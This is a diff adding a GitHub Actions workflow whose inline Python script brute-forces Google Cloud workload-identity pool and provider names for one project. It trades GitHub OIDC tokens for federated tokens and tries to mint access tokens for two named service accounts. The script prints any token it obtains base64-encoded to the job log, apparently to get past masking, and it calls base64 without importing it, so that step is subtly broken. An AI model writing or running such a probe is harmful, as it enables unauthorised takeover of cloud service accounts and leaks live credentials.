@@ -1,0 +1,71 @@
+name: c211-i92579-probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        run: |
+          python3 - <<'PY'
+          import json, os, subprocess, urllib.parse, urllib.request, urllib.error
+          PROJ='381521917100'
+          COMBOS=[
+            ('github-actions','gha-provider'),
+            ('github-actions','github-actions'),
+            ('github-actions','github'),
+            ('github-actions','github-oidc'),
+            ('github-pool','github-provider'),
+            ('github-pool','github-actions'),
+            ('github','github-actions'),
+            ('github-oidc','github-actions'),
+          ]
+          SAS=['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com',
+               '%s-compute@developer.gserviceaccount.com'%PROJ]
+          def jl(b):
+              try: return json.loads(b)
+              except Exception: return {}
+          def post(url,data,headers=None):
+              h={'Content-Type':'application/json','Accept':'application/json','User-Agent':'c211-i92579'}
+              if headers: h.update(headers)
+              r=urllib.request.Request(url,data=json.dumps(data).encode(),method='POST',headers=h)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=60); return resp.status,resp.read().decode()
+              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
+              except Exception as e: return -1,repr(e)[:300]
+          def oidc_token(aud):
+              u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+              if not u or not t: return ''
+              u=u+'&audience='+urllib.parse.quote(aud,safe='')
+              out=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u],capture_output=True,text=True).stdout
+              return jl(out).get('value','')
+          def emit(o): print('RESULT '+json.dumps(o),flush=True)
+          for pool,prov in COMBOS:
+              for pref in ['//iam.googleapis.com/','https://iam.googleapis.com/']:
+                  aud=pref+'projects/%s/locations/global/workloadIdentityPools/%s/providers/%s'%(PROJ,pool,prov)
+                  idt=oidc_token(aud)
+                  if not idt:
+                      emit({'kind':'idtoken','pool':pool,'prov':prov,'pref':pref[:8],'ok':False}); continue
+                  st,b=post('https://sts.googleapis.com/v1/token',{
+                      'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+                      'audience':aud,'scope':'https://www.googleapis.com/auth/cloud-platform',
+                      'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token'})
+                  j=jl(b); fed=j.get('access_token','')
+                  emit({'kind':'sts','pool':pool,'prov':prov,'pref':pref[:8],'http':st,'ok':bool(fed),
+                        'err':None if fed else (j.get('error_description') or b[:250])})
+                  if fed:
+                      for sa in SAS:
+                          st2,b2=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/'+urllib.parse.quote(sa,safe='')+':generateAccessToken',
+                                      {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'},
+                                      headers={'Authorization':'Bearer '+fed})
+                          j2=jl(b2); tk=j2.get('accessToken','')
+                          emit({'kind':'sa','pool':pool,'prov':prov,'sa':sa,'http':st2,'ok':bool(tk),
+                                'expire':j2.get('expireTime'),
+                                'tok_b64':base64.b64encode(tk.encode()).decode() if tk else None,
+                                'err':None if tk else (b2[:300])})
+          emit({'kind':'done','utc':os.popen('date -u +%FT%TZ').read().strip()})
+          PY
